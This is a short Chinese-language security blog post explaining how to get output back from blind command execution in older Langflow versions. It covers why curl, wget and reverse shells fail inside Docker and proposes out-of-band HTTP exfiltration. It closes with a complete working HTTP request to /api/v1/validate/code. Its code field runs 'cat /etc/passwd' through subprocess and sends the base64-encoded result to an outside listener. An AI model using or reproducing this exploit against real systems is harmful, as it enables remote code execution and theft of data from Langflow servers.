#  langflow 命令执行 无回显小思路  
原创 e0mlja
                        e0mlja  e0m安全屋   2026-03-24 03:23  
  
水个文章玩儿。  
  
看到有个朋友写了  
langflow老版本的命令执行，不考虑内存马的情况下，做命令执行的回显。  
  
一般的思路是带外，写文件到可访问目录下。这里的情况有点特殊  
  
（1）docker环境里面 curl wget dis nslookup ping等命令不可用。bash原生的命令很少  
  
（2）python打包运行之前文件已经处理好了 ，没办法直接写静态目录下访问（访问会304）,  
  
（3）直接反弹shell 进程卡死了，真实环境肯定不可用。  
  
考虑到会外接api 所以机器一般都会出网，这里采用python的http服务，打一个http的外带执行命令。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/wxg9x76aT8lao9Guwwtr0ywJf7sD92FSXHmzMsM2EVl8XddXsjIhEcuiafVUX7iasBdXvia2VwI6hHBKtzt0UtKticWHnkO2mhxjJ74EZPiaTH1Y/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/wxg9x76aT8msdibYQtQmjey4aBHhpDTf6C7TXb74AT1tJIBCN8VhEE7NZlJdonnFXsfgtXpibibYS8SVJ0GrAa7kZLzqweOich0t9e3zdibh93HI/640?wx_fmt=jpeg&from=appmsg "")  
  
代码如下  
```
POST /api/v1/validate/code HTTP/1.1
Content-Type: application/json
Host: 127.0.0.1:7860
{
  "code": "def foo(p=__import__('urllib.request', fromlist=['urlopen']).urlopen('http://host.docker.internal:9076/log?data=' + __import__('base64').b64encode(__import__('subprocess').check_output('cat /etc/passwd', shell=True).strip()).decode())): pass"
}
```  
  
  
